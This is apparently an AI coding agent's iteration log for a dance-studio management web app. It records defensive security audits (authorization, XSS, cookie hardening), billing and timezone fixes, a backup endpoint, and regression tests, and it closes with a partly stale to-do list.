- **Found + closed a real billing gap: there was no way to delete/void a posted transaction.** You could create charges/payments and delete a recurring-charge *template*, but a fat-fingered amount, wrong student, or duplicate entry was **permanent** — and the only workaround (posting a fake opposite entry) pollutes revenue reports. That's both an operational gap and a Jackrabbit-parity gap (Jackrabbit lets you void transactions). Built `DELETE /api/transactions/<id>` (admin-only, audit-logged, nulls the two FK back-references — `PendingPayment` and `CostumeAssignment` — so nothing dangles) + a per-row delete button on the student ledger (admin-only, with confirm). Verified: admin delete recomputes the balance to baseline; a parent is blocked (403) and the balance is untouched; a missing id 404s (not 500).
- **Verified a non-finding:** `confirm_pending_payment` is idempotent against double-clicks (`status != 'pending'` → 400), so a double-confirm can't double a payment.
- **Locked in:** `run_transaction_delete` — 5 checks (balance math on create + delete, parent-blocked + balance-untouched, 404). Also caught and fixed a test-only bug (nested `test_client()` context managers bleed sessions — a false 'parent can delete' that isolation disproved). +5 checks.

### Iteration 47b — DONE (smoke 164/164, billing 20/20)
- **Closed the disaster-recovery gap — the biggest un-addressed data-safety risk.** The entire studio (families, kids' PII, the whole financial ledger) is one SQLite file on a Fly volume; if that volume is lost or corrupted, there was **no recovery path and no way for the studio to get their own data out** — a real regression vs Jackrabbit's hosted backups. Built an admin-only `GET /api/admin/backup` that streams a **complete, consistent snapshot** (SQLite online backup API, not a torn file copy) as a timestamped `.db` download, and added a **Data & Backup** card to `/settings` with a one-click Download button. Verified end-to-end: admin gets a valid 45-table SQLite file containing the data; teacher and parent both blocked (403 — it holds every family's PII + finances). Audit-logged, best-effort.
- **Documented the DR story in GO-LIVE:** manual download (do regularly, store off-Fly, = data portability) + verify Fly's daily volume snapshots (`flyctl volumes snapshots list`).
- **Locked in:** `run_backup` — admin gets a valid, data-bearing SQLite backup; parent blocked. +3 checks.

### Iteration 47 — DONE (smoke 161/161, billing 20/20)
- **Verified the day-one fresh-studio state** (directly relevant to a fall go-live: the studio deploys with little/no data). Every prior render test ran against a *seeded* DB; this swept all 87 pages + no-arg API GETs against a **fresh empty studio** (only the auto-seeded admin — no families, classes, transactions, recitals). The usual empty-data landmines (analytics division-by-zero, empty-list indexing in reports/giving-statement) were the concern. **Result: 0 failures — the whole app renders cleanly on an empty studio.** No bug found; a real property confirmed.
- **Locked in:** new `run_empty_state` — boots a fresh DB in a subprocess (this suite's own app is pre-seeded) and asserts no route 5xxs on empty data. Permanent day-one regression guard.

### Iteration 46 — DONE (smoke 160/160, billing 20/20)
- **Audited the session/cookie security config** (standard prod checklist item not yet covered). Session cookie was already solid (Secure in prod, HttpOnly, SameSite=Lax). **Found a gap:** the app uses `login_user(remember=…)` — a long-lived persistent-login credential — but `REMEMBER_COOKIE_SECURE` / `REMEMBER_COOKIE_SAMESITE` were unset, so that cookie didn't get the same hardening as the session cookie. Set `REMEMBER_COOKIE_HTTPONLY=True`, `SAMESITE='Lax'`, a 14-day duration, and `SECURE=True` in production. P3 (defense-in-depth; app is HTTPS).
- **Confirmed the fail-closed `SECRET_KEY` guard accepts a real key** (not just rejects bad ones) — so the GO-LIVE `fly secrets set SECRET_KEY=…` step actually lets the studio deploy. (`SECRET_KEY` is read at config-import time, which is correct for Fly since the secret is in the env before the process starts.)
- **Locked in:** new `run_prod_security_config` — boots ProductionConfig in fresh subprocesses (the only correct way to test import-time-frozen config) to assert the fail-closed guard refuses a default key, accepts a strong one, and applies all 6 session+remember cookie hardening flags. +8 checks.

### Iteration 45 — DONE (smoke 152/152, billing 20/20)
- **Verified object-level authorization on every parent-*allowed* write (the IDOR-in-writes companion to iteration 44's read sweep).** As parent B, attempted all 7 allowed writes — claim payment, sign waiver, acknowledge rule, request makeup, audition signup, ticket order — against parent A's child. **All 7 correctly blocked (403/404).** A parent can write, but only against their own child. The write-authorization model is solid; no IDOR-in-writes.
- **Found + fixed 1 robustness bug:** `claim_payment` did `int(student_id)` / `int(family_id)` on raw input (4 unguarded call sites) → **500 on a garbage id, parent-reachable**. It wasn't in the earlier input-fuzz list because it's a bespoke endpoint. Now validates both via `_valid_id`. Happy path confirmed intact (a parent still claims for their own child/family → 201).
- **Locked in:** new `run_parent_write_authz` — 7 cross-family write-attack probes + 2 claim-robustness checks — so the write-authz surface is a permanent regression guard.

### Iteration 44 — DONE (smoke 143/143, billing 20/20)
- **Swept the entire GET surface for parent data leaks (the P0 was IDOR — this is the systematic follow-up I hadn't done).** Enumerated all 73 `/api` GET endpoints, logged in as a parent, and hit every staff-only and cross-family one. Found **2 real leaks:**
  - `GET /api/classes` — returned the **full class list (instructors, enrollment counts) to any parent**, no staff gate.
  - `GET /api/locations` — returned **studio venues with internal notes/phone to any parent**, no staff gate.
  Both are staff-only in usage (only staff pages fetch them; no parent/public template does). Gated both with `_staff_only()`. Severity P3 (studio-internal info disclosure, no other-family PII/money) — but exactly the default-deny principle the P0 fix established.
- **Verified non-findings:** the two nav-badge count endpoints (`/api/pending-payments/count`, `/api/registrations/count`) 200 for parents but deliberately return a safe `{count: 0}` stub — not leaks.
- **Locked in:** expanded `run_idor` from a 10-endpoint spot-check into a **comprehensive 28-endpoint staff-only GET sweep** + a safe-stub check on the count endpoints + a cross-family `rules-status` probe. The whole parent-visible GET surface is now a permanent regression guard.

### Iteration 43 — DONE (smoke 122/122, billing 20/20)
- **Ran a malformed-input robustness sweep and it found real bugs.** Fuzzed the write endpoints with no-body / empty / garbage-typed / negative payloads. Found and fixed:
  - **P2 data-integrity (parent-reachable):** `POST /api/makeups` did `int(student_id)` with no guard and no existence check — a bad id 500'd, and a *valid-looking but non-existent* id (e.g. `-1`) created an **orphan MakeupClass row that committed before the response crashed**, which then made `GET /api/makeups` 500 **permanently** for all staff (it renders `makeup.student.full_name` on a null student). Now validates the id is a positive int **and** the student exists before creating.
  - **P3 robustness (6 create endpoints):** families, locations, leads, skills, performance-groups crashed with `AttributeError` when `name` was a non-string (`data['name'].strip()` on an int); skills also `int(class_id)`-crashed on a garbage class id. All now go through new `_clean_str()` / `_valid_id()` helpers.
  - **P3 robustness (parent-reachable):** the shared `_require_student_access` / `_require_family_access` helpers did a bare `int(student_id)` that 500'd for a *parent* (staff skip the branch, so the admin sweep couldn't see it). Hardened both; also fixed `signup_for_audition`, `acknowledge_rule`, and `create_ticket_order`'s unguarded id parsing.
- **New helpers:** `_clean_str` (coerce any JSON scalar to a trimmed string so `.strip()` can't blow up), `_valid_id` (positive-int-or-400), plus a `TypeError` guard on `_parse_date`.
- **Locked in:** +24 permanent checks in `smoke_audit.py` — `run_input_robustness` (21 write endpoints × 5 malformed payloads, assert no 500) and `run_parent_input_robustness` (parent posts bad student_ids to signup/acknowledge/ticket-order). Verified the happy path is intact (all valid creates still 201; `name:123` now coerces to `"123"`).

### Iteration 41 — DONE (smoke 98/98)
- **Final UX polish: killed the browser `alert()`s.** Added a single global `toast(message, ok)` notifier to `base.html` (unifying the previously-fragmented feedback systems, P2-3) and converted all 43 raw `alert()`s across the staff CRUD pages to it — only one deliberate alert kept (it shows a copyable Square invoice URL a fading toast would hide). Verified live: styled red/green toast at bottom-center replaces the native browser alert. node-checked all 13 touched templates clean. **The app is now free of both browser prompts and browser alerts.**

### Iteration 40 — DONE (smoke 98/98)
- **Fixed the last known defect — Square webhook `PARTIALLY_PAID` overcount.** The auto-reconcile webhook booked the *full* invoice amount on a partial-payment event and set `paid_at`, which over-counted the payment and then swallowed the eventual `PAID` event. Now it auto-records **only** on full `PAID` (a Square PAID invoice = fully collected); partial payments wait for the PAID event or manual reconciliation. Square isn't live yet, but the go-live runbook enables it, so this would have bitten at turn-on. Verified + regression-guarded (partial ignored, full recorded once, duplicate idempotent). **No known unfixed defects remain.**

### Iteration 39 — DONE (mobile UX verification)
- **Mobile UX pass on the phone-first parent portal** (families use their phones). Viewed the parent dashboard + a modal at 375px in the browser: cards stack, the action chips (Rules/Forms/Statement/Progress/Request makeup) wrap cleanly, the child card's balance/attendance sections read well, and the modals fit the mobile viewport with the dimmed overlay — **no horizontal overflow, no cramped/cut-off content**. The responsive design is solid; no fix needed. Confirms the "UX/UI polished" bar holds on the device parents actually use.

### Iteration 38 — DONE (billing 20/20)
- **Regression-guarded recurring-charge idempotency** — the highest-stakes billing invariant. Auto-billing runs on every app boot, and Fly auto-sleeps/wakes several times a day, so a broken guard would **double-charge every family monthly**. Verified: a recurring charge bills each enrolled student exactly once, and a second run (simulating a Fly wake in the same month) charges nobody again, at the configured amount. Sound — no bug — but it now can't silently regress.

### Iteration 37 — DONE (smoke 95/95)
- **Regression-guarded the core tuition-collection flow.** The pending-payment reconciliation (parent claims a payment → admin confirms → payment Transaction created + balance drops) is how the studio collects tuition manually all fall (no auto-pay). Verified end-to-end: claim creates a PendingPayment; a parent can't confirm (admin-only, 403); admin confirm creates the payment and drops the balance $100→$40; double-confirm is rejected (idempotent). Sound — no bug — but this money-critical flow had no coverage. Added 7 checks.

### Iteration 36 — DONE (smoke 89/89)
- **Enrollment/waitlist lifecycle audit — sound; added coverage.** Traced the fall-critical class flow: enroll is **duplicate-safe** (active→skip, inactive→reactivate, no unique-constraint 500) and staff-gated via the write-guard; unenroll soft-removes; waitlist promotion is a deliberate manual admin action; `max_students` is a soft cap that drives the public "full" indicator + waitlist (staff can override — reasonable). No bug (unlike the auth seam). Added a 6-check enrollment regression (enroll → dedup → count → unenroll → parent-blocked) since this core flow had no coverage.

### Iteration 35 — DONE (smoke 83/83)
- **Auth-lifecycle audit — remaining paths clean + one hardening.** Verified the rest of the account paths are sound: login checks `is_active` and accepts email-or-username; staff create/update guard **both** username and email uniqueness (no dup-key 500s — the register path was the only unguarded one, fixed earlier); `change_password` requires the current password + min-6 + match. **Hardening:** login blocked deactivated users but an existing session lingered ~8h — added a `before_request` that logs out a just-deactivated account on its next request (immediate access revocation; a fired teacher / departed family loses access now, not hours later). Verified + regression-guarded. The account-lifecycle seam is now comprehensively covered (3 P1s fixed earlier + this).

### Iteration 34 — DONE (smoke 81/81)
- **Built self-service password reset (P1-7):** the "Forgot password?" link was dead and there was NO way for a parent to recover a forgotten password (no reset flow, no admin-side parent reset). Added `/auth/forgot-password` + `/auth/reset-password/<token>` with stateless itsdangerous signed tokens + the email service — graceful "contact the studio" fallback until SMTP is on, full email reset once it is. Verified the whole round-trip live + in the browser. Also confirmed the parent-dashboard family banner scopes balances to the parent's own children (no sibling leak).

### Iteration 33 — DONE (smoke 74/74)
- **Found + fixed sibling onboarding (P1-6):** registering a 2nd child's invite with the same email 500'd (unique-email) and, even otherwise, split siblings across separate parent accounts. Now merges the dancer onto the parent's existing login (bulk-update, commit-before-delete to avoid an ORM cascade nulling the moved FK). One family = one login showing all kids, matching Jackrabbit. Added a 4-check regression covering the merge, the account count, and orphan cleanup.

### Iteration 32 — DONE (smoke 70/70)
- **Found + fixed a fall-onboarding lockout (P1-5):** login was username-only, but invited parents get a hidden auto-generated `parent-<code>` username and register with email — so they'd be locked out after logging out. Login now accepts email or username (email is unique). Audited the rest of the invite flow: codes are CSPRNG (`secrets.token_hex`), single-use (nulled after register), and pre-bound to a specific parent+student (no account-takeover vector). Added a 3-check regression.

### Iteration 31 — DONE (smoke 67/67)
- **Comprehensive XSS sweep — clean.** Extended the check beyond names to every user free-text field (note, description, body, title, allergies, venue, reference, memo, …) via a precise per-interpolation scan: **0 unescaped** across all templates. Removed a dead `classOptions()` helper (leftover from the makeup prompt→modal conversion) that held the last unescaped `${c.name}`. Broadened the CI `run_xss_guard` to the full field set so any future unescaped free-text interpolation trips it. The client-side rendering is now verifiably XSS-safe. (`status` and similar are server enums, not injectable — excluded.)

### Iteration 30 — DONE (smoke 67/67)
- **Found + fixed stored XSS (P2-9)** in the aging report and time-clock report — user names rendered into `innerHTML` without `esc()`; student names come from public registration, so this reached admin sessions. Fixed both + added a static XSS regression guard. Swept all templates: no other unescaped user-name interpolations remain.

### Iteration 29 — DONE (smoke 66/66)
- **Fixed a parent-facing date off-by-one** (the display counterpart to P2-8). The parent payment-history table rendered `transaction_date` (a date-only string like `2026-07-05`) with bare `new Date(...)`, which JS parses as UTC midnight → **shows the previous day** in the family's Eastern browser. Changed to `new Date(t.transaction_date+'T00:00')` (local parse), matching the safe pattern every other date-only field already used. Swept all templates: this was the only date-only field displayed unsafely; staff views render the raw ISO string (unaffected).

### Iteration 28 — DONE (billing 17/17)
- **Verified money precision** — summing 100×$10.01 charges + 50×$3.33 payments returns exactly $834.50 through `calc_balance` and the bulk path (no float drift, despite the `float(SUM(Numeric))` cast — SQLite preserves the decimal and 2dp values are float-exact). Added it as a regression guard so a future column-type change can't silently break money math.

### Iteration 27 — DONE (new finding P2-8)
- **Found + fixed a real timezone bug:** the app ran on UTC (Fly default), so for this Eastern studio, evening-class attendance and late payments were dated the next calendar day and the take-attendance "today" list flipped early. The `TIMEZONE` config was dead code. Fixed by installing tzdata + setting `TZ=America/New_York` in the Dockerfile (business dates local, `utcnow()` audit timestamps stay UTC). Mechanism verified. This is a genuine operational correctness fix, not polish.

### Remaining for next iterations
- P1-2 autopay/cards-on-file (biggest parity build — needs Thomas's go-ahead, it's a feature), **✅ NONE — the entire app is prompt-free.** Every data-entry flow is a proper modal. P3-4 SRI (deferred — see above) prompt() flows, P2-3 toast unify, P2-4 aria-labels, P2-5 cron token constant-time check, P2 Square PARTIALLY_PAID semantics, P3s. Full Jackrabbit parity matrix still to expand.
